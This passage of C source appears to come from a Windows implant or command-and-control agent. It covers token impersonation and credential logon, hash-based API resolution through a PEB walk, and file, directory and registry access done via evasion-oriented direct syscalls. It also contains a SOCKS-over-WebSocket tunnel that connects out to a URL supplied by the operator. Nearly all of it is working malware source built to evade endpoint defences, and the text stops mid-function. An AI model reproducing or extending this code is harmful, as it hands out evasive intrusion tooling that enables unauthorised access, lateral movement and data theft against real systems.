        return INVALID_HANDLE_VALUE;
    return dup_token;
}

static BOOL bus_token_impersonate(HANDLE handle) {
    HANDLE current_thread = (HANDLE)(ULONG_PTR)-2;  /* NtCurrentThread */
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTSETINFORMATIONTHREAD,
        current_thread, (DWORD)ThreadImpersonationToken,
        &handle, (ULONG)sizeof(HANDLE));
    return NT_SUCCESS(status);
}

static BOOL bus_token_revert(void) {
    HANDLE null_token = NULL;
    HANDLE current_thread = (HANDLE)(ULONG_PTR)-2;  /* NtCurrentThread */
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTSETINFORMATIONTHREAD,
        current_thread, (DWORD)ThreadImpersonationToken,
        &null_token, (ULONG)sizeof(HANDLE));
    return NT_SUCCESS(status);
}

static HANDLE bus_token_make(const char *user, const char *pass, const char *domain) {
    if (!user || !pass)
        return INVALID_HANDLE_VALUE;

    /* Resolve advapi32.dll via PEB walk + LoadLibraryA fallback */
    PVOID advapi = find_module_by_hash(HASH_ADVAPI32_DLL);
    if (!advapi) {
        /* Try loading via LoadLibraryA from kernel32 */
        typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
        PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
        if (!k32) return INVALID_HANDLE_VALUE;

        fn_LoadLibraryA pLoadLib = (fn_LoadLibraryA)
            find_export_by_hash(k32, 0x0666395B);
        if (!pLoadLib) return INVALID_HANDLE_VALUE;

        char adv_name[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
        advapi = pLoadLib(adv_name);
        if (!advapi) return INVALID_HANDLE_VALUE;
    }

    /* Resolve LogonUserW */
    typedef BOOL (__attribute__((stdcall)) *fn_LogonUserW)(
        PWCHAR, PWCHAR, PWCHAR, DWORD, DWORD, HANDLE *);

    fn_LogonUserW pLogonUserW = (fn_LogonUserW)
        find_export_by_hash(advapi, HASH_LOGONUSERW);
    if (!pLogonUserW)
        return INVALID_HANDLE_VALUE;

    /* Convert ANSI strings to wide on stack */
    WCHAR wuser[128];
    WCHAR wpass[128];
    WCHAR wdomain[128];

    DWORD i;
    for (i = 0; user[i] && i < 127; i++)
        wuser[i] = (WCHAR)(unsigned char)user[i];
    wuser[i] = 0;

    for (i = 0; pass[i] && i < 127; i++)
        wpass[i] = (WCHAR)(unsigned char)pass[i];
    wpass[i] = 0;

    if (domain) {
        for (i = 0; domain[i] && i < 127; i++)
            wdomain[i] = (WCHAR)(unsigned char)domain[i];
        wdomain[i] = 0;
    } else {
        wdomain[0] = '.';
        wdomain[1] = 0;
    }

    HANDLE token = NULL;
    /* LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3 */
    BOOL ok = pLogonUserW(wuser, wdomain, wpass, 9, 3, &token);

    /* Zero password from stack */
    spec_memset(wpass, 0, sizeof(wpass));

    if (!ok)
        return INVALID_HANDLE_VALUE;
    return token;
}

/* ------------------------------------------------------------------ */
/*  File API helper: build NT path UNICODE_STRING on caller stack      */
/*  Converts ANSI path to wide \??\C:\... format                       */
/* ------------------------------------------------------------------ */

#define BUS_MAX_PATH_WCHARS 520

/**
 * Build an NT-format UNICODE_STRING from an ANSI path.
 * Prepends \??\ prefix.  Caller provides wbuf of BUS_MAX_PATH_WCHARS.
 * Returns TRUE on success.
 */
static BOOL bus_build_nt_path(const char *path, WCHAR *wbuf,
                               UNICODE_STRING *us) {
    if (!path || !wbuf || !us)
        return FALSE;

    /* Write \??\ prefix */
    wbuf[0] = '\\';
    wbuf[1] = '?';
    wbuf[2] = '?';
    wbuf[3] = '\\';
    DWORD pos = 4;

    /* Convert ANSI to wide */
    for (DWORD i = 0; path[i] != '\0'; i++) {
        if (pos >= BUS_MAX_PATH_WCHARS - 1)
            return FALSE;
        wbuf[pos++] = (WCHAR)(unsigned char)path[i];
    }
    wbuf[pos] = 0;

    us->Buffer = wbuf;
    us->Length = (USHORT)(pos * sizeof(WCHAR));
    us->MaximumLength = (USHORT)((pos + 1) * sizeof(WCHAR));
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  SOCKS WebSocket virtual file endpoint                              */
/* ------------------------------------------------------------------ */

static BOOL bus_path_equals(const char *path, const char *want) {
    DWORD i = 0;
    if (!path || !want)
        return FALSE;
    while (path[i] || want[i]) {
        if (path[i] != want[i])
            return FALSE;
        i++;
    }
    return TRUE;
}

static DWORD bus_uint_to_str(DWORD val, char *buf, DWORD buf_size) {
    char tmp[12];
    DWORD pos = 0;
    DWORD out = 0;

    if (!buf || buf_size == 0)
        return 0;
    if (val == 0) {
        if (buf_size < 2)
            return 0;
        buf[0] = '0';
        buf[1] = 0;
        return 1;
    }
    while (val > 0 && pos < sizeof(tmp)) {
        tmp[pos++] = (char)('0' + (val % 10));
        val /= 10;
    }
    while (pos > 0 && out + 1 < buf_size)
        buf[out++] = tmp[--pos];
    buf[out] = 0;
    return out;
}

static BOOL __attribute__((unused))
socks_ws_parse_url(const char *url, char *host, DWORD host_len,
                               char *host_header, DWORD host_header_len,
                               char *path, DWORD path_len,
                               DWORD *port_out, BOOL *use_tls_out) {
    DWORD pos = 0, hpos = 0, ppos = 0;
    DWORD port = 0;
    BOOL explicit_port = FALSE;
    BOOL use_tls = FALSE;

    if (!url || !host || !host_header || !path || !port_out || !use_tls_out)
        return FALSE;

    if (url[0] == 'w' && url[1] == 's' && url[2] == 's' &&
        url[3] == ':' && url[4] == '/' && url[5] == '/') {
        use_tls = TRUE;
        port = 443;
        pos = 6;
    } else if (url[0] == 'w' && url[1] == 's' &&
               url[2] == ':' && url[3] == '/' && url[4] == '/') {
        use_tls = FALSE;
        port = 80;
        pos = 5;
    } else if (url[0] == 'h' && url[1] == 't' && url[2] == 't' &&
               url[3] == 'p' && url[4] == 's' &&
               url[5] == ':' && url[6] == '/' && url[7] == '/') {
        use_tls = TRUE;
        port = 443;
        pos = 8;
    } else if (url[0] == 'h' && url[1] == 't' && url[2] == 't' &&
               url[3] == 'p' && url[4] == ':' && url[5] == '/' && url[6] == '/') {
        use_tls = FALSE;
        port = 80;
        pos = 7;
    } else {
        return FALSE;
    }

    while (url[pos] && url[pos] != ':' && url[pos] != '/' && url[pos] != '?') {
        if (hpos + 1 >= host_len)
            return FALSE;
        host[hpos++] = url[pos++];
    }
    host[hpos] = 0;
    if (hpos == 0)
        return FALSE;

    if (url[pos] == ':') {
        explicit_port = TRUE;
        pos++;
        port = 0;
        while (url[pos] >= '0' && url[pos] <= '9') {
            port = port * 10 + (DWORD)(url[pos] - '0');
            pos++;
        }
        if (port == 0 || port > 65535)
            return FALSE;
    }

    if (url[pos] == '/') {
        while (url[pos]) {
            if (ppos + 1 >= path_len)
                return FALSE;
            path[ppos++] = url[pos++];
        }
    } else if (url[pos] == '?') {
        if (path_len < 2)
            return FALSE;
        path[ppos++] = '/';
        while (url[pos]) {
            if (ppos + 1 >= path_len)
                return FALSE;
            path[ppos++] = url[pos++];
        }
    } else {
        path[ppos++] = '/';
    }
    path[ppos] = 0;

    if (hpos + 1 >= host_header_len)
        return FALSE;
    spec_memcpy(host_header, host, hpos);
    host_header[hpos] = 0;
    if (explicit_port) {
        char port_str[8];
        DWORD port_len = bus_uint_to_str(port, port_str, sizeof(port_str));
        if (hpos + 1 + port_len + 1 >= host_header_len)
            return FALSE;
        host_header[hpos++] = ':';
        spec_memcpy(host_header + hpos, port_str, port_len);
        hpos += port_len;
        host_header[hpos] = 0;
    }

    *port_out = port;
    *use_tls_out = use_tls;
    return TRUE;
}

static NTSTATUS socks_ws_wire_send(const BYTE *data, DWORD len) {
    if (g_socks_ws.ws.tls.socket == 0 || g_socks_ws.ws.tls.socket == INVALID_SOCKET)
        return STATUS_UNSUCCESSFUL;
    if (g_socks_ws.use_tls)
        return comms_tls_send(&g_socks_ws.ws.tls, data, len);
    return comms_tcp_send(&g_socks_ws.ws.tls, data, len);
}

static NTSTATUS socks_ws_wire_recv(BYTE *buf, DWORD len, DWORD *received) {
    if (g_socks_ws.ws.tls.socket == 0 || g_socks_ws.ws.tls.socket == INVALID_SOCKET)
        return STATUS_UNSUCCESSFUL;
    if (!bus_socket_readable(g_socks_ws.ws.tls.socket)) {
        *received = 0;
        return STATUS_SUCCESS;
    }
    if (g_socks_ws.use_tls)
        return comms_tls_recv(&g_socks_ws.ws.tls, buf, len, received);
    return comms_tcp_recv(&g_socks_ws.ws.tls, buf, len, received);
}

static BOOL socks_ws_close(void) {
    if (!g_socks_ws.connected) {
        spec_memset(&g_socks_ws, 0, sizeof(g_socks_ws));
        return TRUE;
    }

    {
        BYTE close_payload[2] = { (BYTE)(WS_CLOSE_NORMAL >> 8),
                                  (BYTE)(WS_CLOSE_NORMAL & 0xFF) };
        DWORD close_len = ws_build_frame(&g_socks_ws.ws, WS_OPCODE_CLOSE, TRUE,
                                         close_payload, sizeof(close_payload),
                                         g_socks_ws.ws.send_buf, WS_SEND_BUF_SIZE);
        if (close_len > 0)
            (void)socks_ws_wire_send(g_socks_ws.ws.send_buf, close_len);
    }

    if (g_socks_ws.use_tls)
        comms_tls_close(&g_socks_ws.ws.tls);
    else
        comms_tcp_close(&g_socks_ws.ws.tls);
    spec_memset(&g_socks_ws, 0, sizeof(g_socks_ws));
    return TRUE;
}

static BOOL socks_ws_connect_url(const BYTE *data, DWORD len) {
#ifdef TEST_BUILD
    (void)data;
    (void)len;
    return FALSE;
#else
    char url[SOCKS_WS_MAX_PATH + SOCKS_WS_MAX_HOST];
    DWORD copy_len;
    DWORD port = 0;
    IMPLANT_CONTEXT *ictx;
    COMMS_CONTEXT *base;
    NTSTATUS status;
    DWORD req_len;
    DWORD received = 0;

    if (!data || len == 0)
        return FALSE;
    copy_len = len;
    if (copy_len >= sizeof(url))
        copy_len = sizeof(url) - 1;
    spec_memcpy(url, data, copy_len);
    url[copy_len] = 0;

    socks_ws_close();
    spec_memset(&g_socks_ws, 0, sizeof(g_socks_ws));

    if (!socks_ws_parse_url(url, g_socks_ws.host, sizeof(g_socks_ws.host),
                            g_socks_ws.host_header, sizeof(g_socks_ws.host_header),
                            g_socks_ws.path, sizeof(g_socks_ws.path),
                            &port, &g_socks_ws.use_tls))
        return FALSE;

    ictx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
    if (!ictx || !ictx->comms_ctx)
        return FALSE;
    base = (COMMS_CONTEXT *)ictx->comms_ctx;
    if (!base->api.resolved)
        return FALSE;

    g_socks_ws.ws.ws_state = WS_STATE_DISCONNECTED;
    g_socks_ws.ws.state = COMMS_STATE_DISCONNECTED;
    g_socks_ws.ws.prng_state = 0xC0DEC0DE;
    g_socks_ws.ws.tls.socket = INVALID_SOCKET;
    spec_memcpy(&g_socks_ws.ws.tls.api, &base->api, sizeof(COMMS_API));
    g_socks_ws.ws.tls.wsa_initialized = base->wsa_initialized;

    status = comms_tcp_connect(&g_socks_ws.ws.tls, g_socks_ws.host, port);
    if (!NT_SUCCESS(status))
        goto fail;
    g_socks_ws.ws.ws_state = WS_STATE_TCP_CONNECTED;

    if (g_socks_ws.use_tls) {
        if (!g_socks_ws.ws.tls.api.tls_available)
            goto fail;
        status = comms_tls_init(&g_socks_ws.ws.tls);
        if (!NT_SUCCESS(status))
            goto fail;
        status = comms_tls_handshake(&g_socks_ws.ws.tls, g_socks_ws.host);
        if (!NT_SUCCESS(status))
            goto fail;
        g_socks_ws.ws.ws_state = WS_STATE_TLS_CONNECTED;
    }

    ws_generate_key(&g_socks_ws.ws);
    req_len = ws_build_upgrade_request(&g_socks_ws.ws,
                                       g_socks_ws.host_header,
                                       g_socks_ws.path,
                                       g_socks_ws.ws.handshake_buf,
                                       WS_HANDSHAKE_BUF_SIZE);
    if (req_len == 0)
        goto fail;
    status = socks_ws_wire_send(g_socks_ws.ws.handshake_buf, req_len);
    if (!NT_SUCCESS(status))
        goto fail;
    status = g_socks_ws.use_tls
        ? comms_tls_recv(&g_socks_ws.ws.tls, g_socks_ws.ws.handshake_buf,
                         WS_HANDSHAKE_BUF_SIZE - 1, &received)
        : comms_tcp_recv(&g_socks_ws.ws.tls, g_socks_ws.ws.handshake_buf,
                         WS_HANDSHAKE_BUF_SIZE - 1, &received);
    if (!NT_SUCCESS(status) || received == 0)
        goto fail;
    g_socks_ws.ws.handshake_buf[received] = 0;
    if (!ws_validate_upgrade_response(&g_socks_ws.ws,
                                      g_socks_ws.ws.handshake_buf, received))
        goto fail;

    g_socks_ws.ws.ws_state = WS_STATE_UPGRADED;
    g_socks_ws.ws.state = COMMS_STATE_REGISTERED;
    g_socks_ws.connected = TRUE;
    g_socks_ws.rx_len = 0;
    return TRUE;

fail:
    if (g_socks_ws.use_tls && g_socks_ws.ws.tls.context_valid)
        comms_tls_close(&g_socks_ws.ws.tls);
    else
        comms_tcp_close(&g_socks_ws.ws.tls);
    spec_memset(&g_socks_ws, 0, sizeof(g_socks_ws));
    return FALSE;
#endif
}

static BOOL socks_ws_send_frame(const BYTE *data, DWORD len) {
    DWORD frame_len;
    if (!g_socks_ws.connected || !data || len == 0)
        return FALSE;
    frame_len = ws_build_frame(&g_socks_ws.ws, WS_OPCODE_BINARY, TRUE,
                               data, len, g_socks_ws.ws.send_buf,
                               WS_SEND_BUF_SIZE);
    if (frame_len == 0)
        return FALSE;
    if (!NT_SUCCESS(socks_ws_wire_send(g_socks_ws.ws.send_buf, frame_len))) {
        socks_ws_close();
        return FALSE;
    }
    return TRUE;
}

static DWORD socks_ws_recv_frame(BYTE *buf, DWORD len) {
    DWORD received = 0;
    DWORD consumed;
    WS_FRAME frame;

    if (!g_socks_ws.connected || !buf || len == 0)
        return 0;

    for (;;) {
        consumed = ws_parse_frame(g_socks_ws.rx_buf, g_socks_ws.rx_len, &frame);
        if (consumed > 0)
            break;

        if (g_socks_ws.rx_len >= sizeof(g_socks_ws.rx_buf))
            return 0;
        if (!NT_SUCCESS(socks_ws_wire_recv(g_socks_ws.rx_buf + g_socks_ws.rx_len,
                                           sizeof(g_socks_ws.rx_buf) - g_socks_ws.rx_len,
                                           &received)) || received == 0)
            return 0;
        g_socks_ws.rx_len += received;
    }

    if (frame.masked)
        ws_apply_mask(frame.payload, frame.payload_len, frame.mask_key);

    if (frame.opcode == WS_OPCODE_PING) {
        DWORD pong_len = ws_build_frame(&g_socks_ws.ws, WS_OPCODE_PONG, TRUE,
                                        frame.payload, frame.payload_len,
                                        g_socks_ws.ws.send_buf, WS_SEND_BUF_SIZE);
        if (pong_len > 0)
            (void)socks_ws_wire_send(g_socks_ws.ws.send_buf, pong_len);
        goto shift_and_empty;
    }
    if (frame.opcode == WS_OPCODE_CLOSE) {
        socks_ws_close();
        return 0;
    }
    if (frame.opcode != WS_OPCODE_BINARY || frame.payload_len > len)
        goto shift_and_empty;

    spec_memcpy(buf, frame.payload, frame.payload_len);
    received = frame.payload_len;

    {
        DWORD remain = g_socks_ws.rx_len - consumed;
        DWORD i;
        for (i = 0; i < remain; i++)
            g_socks_ws.rx_buf[i] = g_socks_ws.rx_buf[consumed + i];
        g_socks_ws.rx_len = remain;
    }
    return received;

shift_and_empty:
    {
        DWORD remain = g_socks_ws.rx_len - consumed;
        DWORD i;
        for (i = 0; i < remain; i++)
            g_socks_ws.rx_buf[i] = g_socks_ws.rx_buf[consumed + i];
        g_socks_ws.rx_len = remain;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/*  File API implementations                                           */
/* ------------------------------------------------------------------ */

static DWORD bus_file_read(const char *path, BYTE *buf, DWORD len) {
    if (!path || !buf || len == 0)
        return 0;

    if (bus_path_equals(path, "\\\\.\\socks\\ws"))
        return socks_ws_recv_frame(buf, len);

    {
        char socks_inbox[] = {
            '\\','\\','.','\\','s','o','c','k','s','\\','i','n','b','o','x',0
        };
        DWORD i = 0;
        BOOL match = TRUE;
        while (socks_inbox[i] || path[i]) {
            if (socks_inbox[i] != path[i]) {
                match = FALSE;
                break;
            }
            i++;
        }
        if (match)
            return task_socks_inbox_read(buf, len);
    }

    WCHAR wpath[BUS_MAX_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_nt_path(path, wpath, &us_path))
        return 0;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    HANDLE file = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATEFILE,
        &file, (ULONG)(GENERIC_READ | SYNCHRONIZE), &oa, &iosb,
        (PLARGE_INTEGER)NULL, (ULONG)FILE_ATTRIBUTE_NORMAL,
        (ULONG)(FILE_SHARE_READ | FILE_SHARE_WRITE),
        (ULONG)FILE_OPEN,
        (ULONG)FILE_SYNCHRONOUS_IO_NONALERT,
        (PVOID)NULL, (ULONG)0);

    if (!NT_SUCCESS(status))
        return 0;

    spec_memset(&iosb, 0, sizeof(iosb));
    status = evasion_syscall(bus_get_evasion(),
        HASH_NTREADFILE,
        file, (HANDLE)NULL, (PVOID)NULL, (PVOID)NULL,
        &iosb, (PVOID)buf, (ULONG)len,
        (PLARGE_INTEGER)NULL, (PULONG)NULL);

    DWORD bytes_read = NT_SUCCESS(status) ? (DWORD)iosb.Information : 0;

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, file);
    return bytes_read;
}

static BOOL bus_file_write(const char *path, const BYTE *data, DWORD len) {
    if (!path || !data || len == 0)
        return FALSE;

    if (bus_path_equals(path, "\\\\.\\socks\\ws-url"))
        return socks_ws_connect_url(data, len);
    if (bus_path_equals(path, "\\\\.\\socks\\ws"))
        return socks_ws_send_frame(data, len);
    if (bus_path_equals(path, "\\\\.\\socks\\ws-close"))
        return socks_ws_close();

    WCHAR wpath[BUS_MAX_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_nt_path(path, wpath, &us_path))
        return FALSE;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    HANDLE file = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATEFILE,
        &file, (ULONG)(GENERIC_WRITE | SYNCHRONIZE), &oa, &iosb,
        (PLARGE_INTEGER)NULL, (ULONG)FILE_ATTRIBUTE_NORMAL,
        (ULONG)(FILE_SHARE_READ | FILE_SHARE_WRITE),
        (ULONG)FILE_OPEN_IF_NTDEFS,
        (ULONG)FILE_SYNCHRONOUS_IO_NONALERT,
        (PVOID)NULL, (ULONG)0);

    if (!NT_SUCCESS(status))
        return FALSE;

    spec_memset(&iosb, 0, sizeof(iosb));
    status = evasion_syscall(bus_get_evasion(),
        HASH_NTWRITEFILE,
        file, (HANDLE)NULL, (PVOID)NULL, (PVOID)NULL,
        &iosb, (PVOID)data, (ULONG)len,
        (PLARGE_INTEGER)NULL, (PULONG)NULL);

    BOOL ok = NT_SUCCESS(status);
    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, file);
    return ok;
}

static BOOL bus_file_delete(const char *path) {
    if (!path)
        return FALSE;

    if (bus_path_equals(path, "\\\\.\\socks\\ws") ||
        bus_path_equals(path, "\\\\.\\socks\\ws-close"))
        return socks_ws_close();

    WCHAR wpath[BUS_MAX_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_nt_path(path, wpath, &us_path))
        return FALSE;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    HANDLE file = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATEFILE,
        &file, (ULONG)(DELETE_ACCESS | SYNCHRONIZE), &oa, &iosb,
        (PLARGE_INTEGER)NULL, (ULONG)FILE_ATTRIBUTE_NORMAL,
        (ULONG)(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE),
        (ULONG)FILE_OPEN,
        (ULONG)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE),
        (PVOID)NULL, (ULONG)0);

    if (!NT_SUCCESS(status))
        return FALSE;

    /* Closing the handle with FILE_DELETE_ON_CLOSE triggers deletion */
    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, file);
    return TRUE;
}

static PVOID bus_file_list(const char *path) {
    if (!path)
        return NULL;

    WCHAR wpath[BUS_MAX_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_nt_path(path, wpath, &us_path))
        return NULL;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    HANDLE dir = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTCREATEFILE,
        &dir, (ULONG)(FILE_LIST_DIRECTORY | SYNCHRONIZE), &oa, &iosb,
        (PLARGE_INTEGER)NULL, (ULONG)FILE_ATTRIBUTE_DIRECTORY,
        (ULONG)(FILE_SHARE_READ | FILE_SHARE_WRITE),
        (ULONG)FILE_OPEN,
        (ULONG)(FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT),
        (PVOID)NULL, (ULONG)0);

    if (!NT_SUCCESS(status))
        return NULL;

    /* Allocate result buffer: [count:u32][entries...] */
    #define FILE_LIST_BUF_SIZE  (32 * 1024)
    BYTE *result = (BYTE *)bus_mem_alloc(FILE_LIST_BUF_SIZE, PAGE_READWRITE);
    if (!result) {
        evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, dir);
        return NULL;
    }
    spec_memset(result, 0, FILE_LIST_BUF_SIZE);

    /* Reserve 4 bytes for count at start */
    DWORD offset = sizeof(DWORD);
    DWORD count = 0;

    /* Query buffer for NtQueryDirectoryFile */
    BYTE query_buf[4096];
    BOOL first = TRUE;

    for (;;) {
        spec_memset(&iosb, 0, sizeof(iosb));
        spec_memset(query_buf, 0, sizeof(query_buf));

        status = evasion_syscall(bus_get_evasion(),
            HASH_NTQUERYDIRECTORYFILE,
            dir, (HANDLE)NULL, (PVOID)NULL, (PVOID)NULL,
            &iosb, (PVOID)query_buf, (ULONG)sizeof(query_buf),
            (DWORD)FileBothDirectoryInformation,
            (BOOL)FALSE, (PUNICODE_STRING)NULL, (BOOL)first);

        first = FALSE;

        if (!NT_SUCCESS(status) && status != STATUS_BUFFER_OVERFLOW)
            break;

        /* Walk entries in the buffer */
        FILE_BOTH_DIR_INFORMATION *entry = (FILE_BOTH_DIR_INFORMATION *)query_buf;
        for (;;) {
            DWORD name_bytes = entry->FileNameLength;
            DWORD name_wchars = name_bytes / sizeof(WCHAR);

            /* Each result entry: [name_len:u16][name_wchars...][size:u64][attrs:u32] */
            DWORD entry_size = sizeof(WORD) + name_bytes +
                               sizeof(QWORD) + sizeof(DWORD);

            if (offset + entry_size > FILE_LIST_BUF_SIZE)
                goto done_listing;

            /* Write name_len (wchar count) */
            *(WORD *)(result + offset) = (WORD)name_wchars;
            offset += sizeof(WORD);

            /* Write name wchars */
            spec_memcpy(result + offset, entry->FileName, name_bytes);
            offset += name_bytes;

            /* Write file size */
            *(QWORD *)(result + offset) = (QWORD)entry->EndOfFile.QuadPart;
            offset += sizeof(QWORD);

            /* Write attributes */
            *(DWORD *)(result + offset) = entry->FileAttributes;
            offset += sizeof(DWORD);

            count++;

            if (entry->NextEntryOffset == 0)
                break;
            entry = (FILE_BOTH_DIR_INFORMATION *)((BYTE *)entry + entry->NextEntryOffset);
        }
    }

done_listing:
    /* Write entry count at start of buffer */
    *(DWORD *)result = count;

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, dir);
    return (PVOID)result;
}

/* ------------------------------------------------------------------ */
/*  Registry API helper: build registry path UNICODE_STRING             */
/*  hive 0 = \Registry\Machine, hive 1 = \Registry\User               */
/* ------------------------------------------------------------------ */

#define BUS_MAX_REG_PATH_WCHARS 520

static BOOL bus_build_reg_path(DWORD hive, const char *path,
                                WCHAR *wbuf, UNICODE_STRING *us) {
    if (!path || !wbuf || !us)
        return FALSE;

    DWORD pos = 0;

    /* Write hive prefix */
    if (hive == 0) {
        /* \Registry\Machine\ */
        WCHAR prefix[] = { '\\','R','e','g','i','s','t','r','y',
                           '\\','M','a','c','h','i','n','e','\\', 0 };
        for (DWORD i = 0; prefix[i]; i++)
            wbuf[pos++] = prefix[i];
    } else {
        /* \Registry\User\ */
        WCHAR prefix[] = { '\\','R','e','g','i','s','t','r','y',
                           '\\','U','s','e','r','\\', 0 };
        for (DWORD i = 0; prefix[i]; i++)
            wbuf[pos++] = prefix[i];
    }

    /* Append subkey path */
    for (DWORD i = 0; path[i] != '\0'; i++) {
        if (pos >= BUS_MAX_REG_PATH_WCHARS - 1)
            return FALSE;
        wbuf[pos++] = (WCHAR)(unsigned char)path[i];
    }
    wbuf[pos] = 0;

    us->Buffer = wbuf;
    us->Length = (USHORT)(pos * sizeof(WCHAR));
    us->MaximumLength = (USHORT)((pos + 1) * sizeof(WCHAR));
    return TRUE;
}

static BOOL bus_build_value_name(const char *value, WCHAR *wbuf,
                                  UNICODE_STRING *us) {
    if (!value || !wbuf || !us)
        return FALSE;

    DWORD pos = 0;
    for (DWORD i = 0; value[i] != '\0'; i++) {
        if (pos >= BUS_MAX_REG_PATH_WCHARS - 1)
            return FALSE;
        wbuf[pos++] = (WCHAR)(unsigned char)value[i];
    }
    wbuf[pos] = 0;

    us->Buffer = wbuf;
    us->Length = (USHORT)(pos * sizeof(WCHAR));
    us->MaximumLength = (USHORT)((pos + 1) * sizeof(WCHAR));
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  Registry API implementations                                       */
/* ------------------------------------------------------------------ */

static DWORD bus_reg_read(DWORD hive, const char *path, const char *value) {
    if (!path || !value)
        return 0;

    WCHAR wpath[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_reg_path(hive, path, wpath, &us_path))
        return 0;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE key = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENKEY, &key, (ULONG)KEY_QUERY_VALUE, &oa);

    if (!NT_SUCCESS(status))
        return 0;

    /* Build value name UNICODE_STRING */
    WCHAR wvalue[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_value;
    if (!bus_build_value_name(value, wvalue, &us_value)) {
        evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);
        return 0;
    }

    /* Query value — allocate buffer for KEY_VALUE_PARTIAL_INFORMATION */
    BYTE info_buf[512];
    ULONG result_len = 0;

    status = evasion_syscall(bus_get_evasion(),
        HASH_NTQUERYVALUEKEY,
        key, &us_value, (DWORD)KeyValuePartialInformation,
        (PVOID)info_buf, (ULONG)sizeof(info_buf), &result_len);

    evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);

    if (!NT_SUCCESS(status))
        return 0;

    KEY_VALUE_PARTIAL_INFORMATION *info = (KEY_VALUE_PARTIAL_INFORMATION *)info_buf;

    /* Write result to output ring: [type:u32][data_len:u32][data...] */
    BYTE out_buf[BUS_OUTPUT_ENTRY_MAX];
    DWORD out_len = sizeof(DWORD) + sizeof(DWORD) + info->DataLength;
    if (out_len > BUS_OUTPUT_ENTRY_MAX)
        out_len = BUS_OUTPUT_ENTRY_MAX;

    *(DWORD *)out_buf = info->Type;
    *(DWORD *)(out_buf + sizeof(DWORD)) = info->DataLength;

    DWORD copy_len = out_len - 2 * sizeof(DWORD);
    if (copy_len > info->DataLength)
        copy_len = info->DataLength;
    spec_memcpy(out_buf + 2 * sizeof(DWORD), info->Data, copy_len);

    output_write(&g_bus_ctx.output_ring, out_buf, out_len, OUTPUT_BINARY);
    return info->DataLength;
}

static BOOL bus_reg_write(DWORD hive, const char *path, const char *value,
                          const BYTE *data, DWORD type) {
    if (!path || !value || !data)
        return FALSE;

    WCHAR wpath[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_path;
    if (!bus_build_reg_path(hive, path, wpath, &us_path))
        return FALSE;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* Try NtOpenKey first, fall back to NtCreateKey */
    HANDLE key = NULL;
    NTSTATUS status = evasion_syscall(bus_get_evasion(),
        HASH_NTOPENKEY, &key, (ULONG)KEY_SET_VALUE, &oa);

    if (!NT_SUCCESS(status)) {
        ULONG disposition = 0;
        status = evasion_syscall(bus_get_evasion(),
            HASH_NTCREATEKEY,
            &key, (ULONG)KEY_SET_VALUE, &oa,
            (ULONG)0, (PUNICODE_STRING)NULL,
            (ULONG)0, &disposition);

        if (!NT_SUCCESS(status))
            return FALSE;
    }

    /* Build value name */
    WCHAR wvalue[BUS_MAX_REG_PATH_WCHARS];
    UNICODE_STRING us_value;
    if (!bus_build_value_name(value, wvalue, &us_value)) {
        evasion_syscall(bus_get_evasion(), HASH_NTCLOSE, key);
        return FALSE;
    }

    /* Compute data size from type — caller provides raw data with length
       encoded in the bus protocol.  For simplicity, use spec_strlen for
       REG_SZ, or pass full buffer for binary types. */
    DWORD data_size = 0;
    if (type == 1 || type == 2) {
        /* REG_SZ (1) or REG_EXPAND_SZ (2): data is null-terminated wide string */
        WCHAR *ws = (WCHAR *)data;
        while (ws[data_size / sizeof(WCHAR)] != 0)
